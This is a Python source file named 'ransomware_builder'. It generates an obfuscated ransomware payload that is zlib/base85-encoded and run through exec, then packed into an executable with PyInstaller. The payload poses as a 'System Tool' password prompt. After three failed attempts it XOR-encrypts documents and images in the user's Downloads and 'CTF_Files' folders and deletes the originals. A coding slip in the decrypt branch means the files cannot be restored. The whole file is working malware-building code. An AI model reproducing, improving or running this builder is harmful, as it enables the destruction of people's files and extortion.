# Copyright (c) 2025 pxwild. All rights reserved.
# This software and its source code are proprietary and confidential.
# Unauthorized copying, modification, or distribution of this software,
# via any medium, is strictly prohibited without prior written permission.

import base64
import getpass
import os
import tempfile
import shutil
import random
import string
import zlib
import sys

def main():
    print("[+] Starting ransomware_builder...")
    
    def rn(l=12):
        return ''.join(random.choice(string.ascii_letters) for _ in range(l))

    def oc(c):
        co = zlib.compress(c.encode('utf-8'))
        en = base64.b85encode(co).decode('ascii')
        lc = f'''
import zlib
import base64
import importlib.util

def {rn()}():
    d = "{en}"
    co = base64.b85decode(d.encode('ascii'))
    cd = zlib.decompress(co).decode('utf-8')
    s = importlib.util.spec_from_loader("{rn()}", loader=None)
    m = importlib.util.module_from_spec(s)
    exec(cd, m.__dict__)
    return m

{rn()} = {rn()}()
'''
        return lc

    def bp():
        pp = getpass.getpass("Set ransomware password: ")
        cp = getpass.getpass("Confirm ransomware password: ")
        if pp != cp:
            print("Passwords do not match. Exiting.")
            return

        cc = f'''
import os
import sys
import ctypes
import getpass
import base64
import hashlib
import time

def ia():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def dk(pw, st):
    k = hashlib.pbkdf2_hmac(
        'sha256',
        pw.encode('utf-8'),
        st,
        100000,
        32
    )
    return base64.urlsafe_b64encode(k)

def se(d, k):
    k = k * (len(d) // len(k) + 1)
    return bytes([a ^ b for a, b in zip(d, k)])

def sd(d, k):
    return se(d, k)

def pf(m, pw):
    td = [
        os.path.join(os.environ.get("USERPROFILE", ""), "Desktop", "CTF_Files"),
        os.path.join(os.environ.get("USERPROFILE", ""), "Documents", "CTF_Files"),
        os.path.join(os.environ.get("USERPROFILE", ""), "Downloads"),
    ]
    
    fe = [".txt", ".docx", ".pdf", ".jpg"]
    st = b'fixed_salt_12345'
    
    k = dk(pw, st)
    pc = 0
    
    for dr in td:
        if not os.path.exists(dr):
            continue
            
        for r, ds, fs in os.walk(dr):
            for f in fs:
                fp = os.path.join(r, f)
                
                sp = any(f.endswith(ext) for ext in fe)
                if m == "decrypt":
                    sp = f.endswith(".enc")
                
                if sp:
                    try:
                        with open(fp, "rb") as fl:
                            dt = fl.read()
                        
                        if m == "encrypt":
                            ed = se(dt, k)
                            np = fp + ".enc"
                            with open(np, "wb") as fl:
                                fl.write(ed)
                            os.remove(fp)
                            pc += 1
                            
                        elif m == "decrypt":
                            dd = sd(dt, k)
                            op = fp.replace(".enc", "")
                            with open(op, "wb") as fl:
                                f.write(dd)
                            os.remove(fp)
                            pc += 1
                            
                    except:
                        continue
    
    return pc

def m():
    if not ia():
        return
    
    print("System Tool")
    
    time.sleep(1)
    
    at = 3
    cpw = "{pp}"
    
    while at > 0:
        try:
            ui = getpass.getpass(f"Enter decryption password ({{at}} attempts): ")
            
            if ui == cpw:
                dc = pf("decrypt", ui)
                print(f"Restored {{dc}} files.")
                break
            else:
                at -= 1
                if at == 0:
                    print("Maximum attempts reached.")
                    time.sleep(2)
                    ec = pf("encrypt", cpw)
                    print(f"Secured {{ec}} files.")
                else:
                    print("Invalid password.")
                    
        except KeyboardInterrupt:
            break
        except:
            at -= 1

if __name__ == "__main__":
    m()
'''

        oc_code = oc(cc)
        
        bd = tempfile.mkdtemp()
        sf = os.path.join(bd, f"sys_{rn()}.py")
        
        try:
            with open(sf, 'w', encoding='utf-8') as f:
                f.write(oc_code)
            
            try:
                import PyInstaller.__main__
                PyInstaller.__main__.run([
                    sf,
                    '--onefile',
                    '--console',
                    '--name', 'ransomware', 
                    '--clean',
                    '--distpath', './',
                ])
                print("Executable created successfully.")
            except:
                lc = f'''
import os
import tempfile
import subprocess
import sys

ec = """{oc_code}"""

with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
    f.write(ec.encode('utf-8'))
    tf = f.name

try:
    subprocess.run([sys.executable, tf])
finally:
    os.unlink(tf)
'''
                
                of = f"ransomware.py" 
                with open(of, 'w', encoding='utf-8') as f:
                    f.write(lc)
                
                print(f"Created Python loader: {of}")
            
        finally:
            shutil.rmtree(bd, ignore_errors=True)

    bp()
    
    print("[+] ransomware_builder finished.")
    input("\nPress Enter to return...")

if __name__ == "__main__":

    main()
